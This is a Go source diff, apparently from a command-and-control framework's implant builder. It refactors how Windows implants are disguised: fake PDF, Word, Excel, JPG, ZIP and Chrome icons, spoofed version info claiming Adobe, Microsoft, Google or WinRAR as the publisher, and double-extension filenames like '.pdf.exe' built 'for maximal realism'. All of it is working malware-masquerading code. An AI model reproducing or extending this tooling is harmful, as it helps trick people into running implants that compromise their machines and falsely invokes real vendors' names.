@@ -9,7 +9,6 @@ import (
 	"image/png"
 	"os"
 	"path/filepath"
-	"strings"
 
 	"github.com/tc-hib/winres"
 	"github.com/tc-hib/winres/version"
@@ -27,9 +26,11 @@ func loadPresetIcons() {
 		"xls":    {22, 163, 74}, // excel green
 		"zip":    {234, 179, 8}, // yellow
 		"folder": {234, 179, 8},
-		"chrome": {59, 130, 246}, // chrome blue
+		"chrome": {59, 130, 246},  // chrome blue
+		"txt":    {100, 116, 139}, // slate document
+		"png":    {52, 119, 235},  // photo blue
 	}
-	for _, name := range []string{"jpg", "pdf", "word", "folder", "chrome", "zip", "doc", "xls"} {
+	for _, name := range []string{"jpg", "pdf", "word", "folder", "chrome", "zip", "doc", "xls", "txt", "png"} {
 		data, err := iconsFS.ReadFile("icons/" + name + ".ico")
 		if err == nil && len(data) > 0 {
 			// Use embedded if not placeholder (check not all same size)
@@ -45,20 +46,54 @@ func loadPresetIcons() {
 	}
 }
 
+// generateSolidPNG draws a generic document glyph (white page, folded corner,
+// grey content lines, type-colour band) instead of a flat square, so the rare
+// fallback icon still reads as a file at taskbar sizes.
 func generateSolidPNG(r, g, b uint8) []byte {
 	const size = 256
 	img := image.NewRGBA(image.Rect(0, 0, size, size))
-	// Fill background
-	for y := 0; y < size; y++ {
-		for x := 0; x < size; x++ {
-			// subtle border
-			if x < 8 || x >= size-8 || y < 8 || y >= size-8 {
-				img.Set(x, y, color.RGBA{255, 255, 255, 255})
-			} else {
-				img.Set(x, y, color.RGBA{r, g, b, 255})
+	fill := func(x0, y0, x1, y1 int, c color.RGBA) {
+		if x0 < 0 {
+			x0 = 0
+		}
+		if y0 < 0 {
+			y0 = 0
+		}
+		if x1 > size {
+			x1 = size
+		}
+		if y1 > size {
+			y1 = size
+		}
+		for y := y0; y < y1; y++ {
+			for x := x0; x < x1; x++ {
+				img.Set(x, y, c)
 			}
 		}
 	}
+	white := color.RGBA{255, 255, 255, 255}
+	grey := color.RGBA{160, 160, 160, 255}
+	fold := color.RGBA{205, 205, 205, 255}
+	line := color.RGBA{190, 190, 190, 255}
+	band := color.RGBA{r, g, b, 255}
+	// page body + border
+	fill(56, 24, 200, 232, white)
+	fill(56, 24, 200, 28, grey)
+	fill(56, 228, 200, 232, grey)
+	fill(56, 24, 60, 232, grey)
+	fill(196, 64, 200, 232, grey)
+	// folded top-right corner
+	for i := 0; i < 40; i++ {
+		fill(160+i, 24, 200, 24+40-i, fold)
+	}
+	fill(160, 24, 200, 28, grey)
+	// content lines above the band
+	fill(76, 92, 180, 100, line)
+	fill(76, 112, 180, 120, line)
+	fill(76, 132, 150, 140, line)
+	// type-colour band across the page
+	fill(56, 156, 200, 196, band)
+	_ = white
 	var buf bytes.Buffer
 	if err := png.Encode(&buf, img); err != nil {
 		// In-memory encode of a generated RGBA cannot realistically fail;
@@ -99,21 +134,18 @@ func injectIconResource(tmpDir string, cfg ImplantConfig) error {
 			}
 		}
 	} else if preset != "" {
-		if b64, ok := presetIcons[preset]; ok && b64 != "" {
-			// Preset icons are generated at init; a decode failure means a
-			// corrupt embed — fall through to no icon rather than a partial.
+		if b64, ok := presetIcons[NormalizeDisguise(preset)]; ok && b64 != "" {
 			if decoded, derr := base64.StdEncoding.DecodeString(b64); derr == nil {
 				iconData = decoded
 			}
 		}
 	}
 	if len(iconData) == 0 && disguise != "" {
-		if b64, ok := presetIcons[disguise]; ok && b64 != "" {
+		if b64, ok := presetIcons[DisguiseIconPreset(disguise)]; ok && b64 != "" {
 			if decoded, derr := base64.StdEncoding.DecodeString(b64); derr == nil {
 				iconData = decoded
 			}
 		} else if b64, ok := presetIcons["jpg"]; ok && b64 != "" {
-			// fallback to jpg for unknown disguise
 			if decoded, derr := base64.StdEncoding.DecodeString(b64); derr == nil {
 				iconData = decoded
 			}
@@ -130,63 +162,13 @@ func injectIconResource(tmpDir string, cfg ImplantConfig) error {
 		var fv, pv [4]uint16
 		fvStr, pvStr := "1.0.0.0", "1.0.0.0"
 		if fd == "" {
-			switch disguise {
-			case "pdf":
-				fd = "PDF Document"
-				cn = "Adobe Systems Incorporated"
-				fv, pv = [4]uint16{23, 1, 20143, 0}, [4]uint16{23, 1, 20143, 0}
-				fvStr, pvStr = "23.001.20143.0", "23.001.20143.0"
-				if cfg.CompanyName != "" {
-					cn = cfg.CompanyName
-				}
-			case "word", "doc":
-				fd = "Microsoft Word Document"
-				cn = "Microsoft Corporation"
-				fv, pv = [4]uint16{16, 0, 17328, 0}, [4]uint16{16, 0, 17328, 0}
-				fvStr, pvStr = "16.0.17328.0", "16.0.17328.0"
-				if cfg.CompanyName != "" {
-					cn = cfg.CompanyName
-				}
-			case "xls":
-				fd = "Microsoft Excel Worksheet"
-				cn = "Microsoft Corporation"
-				fv, pv = [4]uint16{16, 0, 17328, 0}, [4]uint16{16, 0, 17328, 0}
-				fvStr, pvStr = "16.0.17328.0", "16.0.17328.0"
-				if cfg.CompanyName != "" {
-					cn = cfg.CompanyName
-				}
-			case "zip":
-				fd = "Compressed Archive"
-				cn = "WinRAR"
-				fv, pv = [4]uint16{6, 24, 0, 0}, [4]uint16{6, 24, 0, 0}
-				fvStr, pvStr = "6.24.0.0", "6.24.0.0"
-				if cfg.CompanyName != "" {
-					cn = cfg.CompanyName
-				}
-			case "folder":
-				fd = "File Folder"
-				cn = "Microsoft Corporation"
-				fv, pv = [4]uint16{10, 0, 19041, 0}, [4]uint16{10, 0, 19041, 0}
-				fvStr, pvStr = "10.0.19041.0", "10.0.19041.0"
-				if cfg.CompanyName != "" {
-					cn = cfg.CompanyName
-				}
-			case "chrome":
-				fd = "Chrome Installer"
-				cn = "Google LLC"
-				fv, pv = [4]uint16{120, 0, 6099, 71}, [4]uint16{120, 0, 6099, 71}
-				fvStr, pvStr = "120.0.6099.71", "120.0.6099.71"
-				if cfg.CompanyName != "" {
-					cn = cfg.CompanyName
-				}
-			default: // jpg etc
-				fd = "JPEG Image"
-				cn = "Microsoft Corporation"
-				fv, pv = [4]uint16{2024, 11020, 1000, 0}, [4]uint16{2024, 11020, 1000, 0}
-				fvStr, pvStr = "2024.11020.1000.0", "2024.11020.1000.0"
-				if cfg.CompanyName != "" {
-					cn = cfg.CompanyName
-				}
+			mfd, mcn, mfvStr, mpvStr := DisguiseFileMeta(disguise)
+			fd, fvStr, pvStr = mfd, mfvStr, mpvStr
+			fv, pv = DisguiseFileVers(disguise)
+			if cfg.CompanyName != "" {
+				cn = cfg.CompanyName
+			} else {
+				cn = mcn
 			}
 		} else {
 			fv, pv = [4]uint16{1, 0, 0, 0}, [4]uint16{1, 0, 0, 0}
@@ -214,30 +196,7 @@ func injectIconResource(tmpDir string, cfg ImplantConfig) error {
 		setVer(version.ProductVersion, pvStr)
 		setVer(version.LegalCopyright, "© "+cn)
 		// OriginalFilename should match the disguised output name for maximal realism
-		orig := safeBuildFileName(cfg.Filename)
-		if disguise != "" {
-			// Recompute disguised name as GenerateWindowsEXE does
-			disguiseExt := ""
-			switch disguise {
-			case "jpg":
-				disguiseExt = ".jpg"
-			case "pdf":
-				disguiseExt = ".pdf"
-			case "doc", "word":
-				disguiseExt = ".docx"
-			case "xls":
-				disguiseExt = ".xlsx"
-			case "zip":
-				disguiseExt = ".zip"
-			}
-			if disguiseExt != "" {
-				base := strings.TrimSuffix(orig, ".exe")
-				base = strings.TrimSuffix(base, ".EXE")
-				if !strings.Contains(strings.ToLower(base), disguiseExt) {
-					orig = base + disguiseExt + ".exe"
-				}
-			}
-		}
+		orig := ApplyDisguiseFilename(safeBuildFileName(cfg.Filename), disguise)
 		if orig == "" {
 			orig = "forgec2_agent.exe"
 		}
